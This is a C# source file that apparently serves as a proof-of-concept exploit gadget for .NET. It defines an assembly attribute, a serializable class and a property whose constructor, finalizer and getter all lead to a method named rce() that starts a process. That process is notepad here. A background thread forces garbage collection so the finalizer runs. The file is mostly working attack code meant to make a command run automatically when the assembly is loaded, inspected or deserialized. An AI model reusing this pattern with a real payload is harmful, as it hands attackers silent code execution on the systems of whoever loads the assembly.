using FakeAsm;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;


[assembly: MyattrFakeAtribute]
namespace FakeAsm
{
    [Serializable]
    public class ClassFake : MarshalByRefObject
    {
        public ClassFake()
        {
            Console.WriteLine("FakeClass ctor");
        }

        ~ClassFake()
        {

            Console.WriteLine("FakeClass dctor");
            rce();
        }

        public static void rce()
        {
            string cmd = "notepad";
            Console.WriteLine("System.Diagnostics.Process.Start :=>" + cmd);

           System.Diagnostics.Process.Start(cmd);
        }

        public static object Rcefakeobbj()
        {
            rce();
            return 1;
        }
        [MyattrFakeAtribute]
        public static object fakeobbj
        {
            get
            {
                return Rcefakeobbj();
            }
        }

        
    }
    [AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Property, Inherited = false)]
    public class MyattrFakeAtribute : Attribute
    {
        public MyattrFakeAtribute()
        {
            Rcefakeattribute();
        }

        public static void RceCallGC()
        {
            try
            {
                Console.WriteLine("StartNew GC Spawn Thread");
                Thread.Sleep(2000);

                Console.WriteLine("StartNew GC After Thread.Sleep(2000)");

                GC.Collect(0, GCCollectionMode.Forced);

                Console.WriteLine("GC.Collect(0, GCCollectionMode.Forced);");
            }
            catch (Exception e)
            {
                Console.WriteLine(e);

            }
        }

        public static object Rcefakeattribute()
        {
            try
            {
                Console.WriteLine("PermitOnly");


                Console.WriteLine("StartNew FakeClass");
                ClassFake fake = new ClassFake();

                Thread thd = new Thread(RceCallGC);
                thd.IsBackground = true;
                thd.Start();
                Console.WriteLine("RevertPermitOnly");
               

            }
            catch (Exception e)
            {
                Console.WriteLine(e);

            }

            return 1;
        }
    }
}
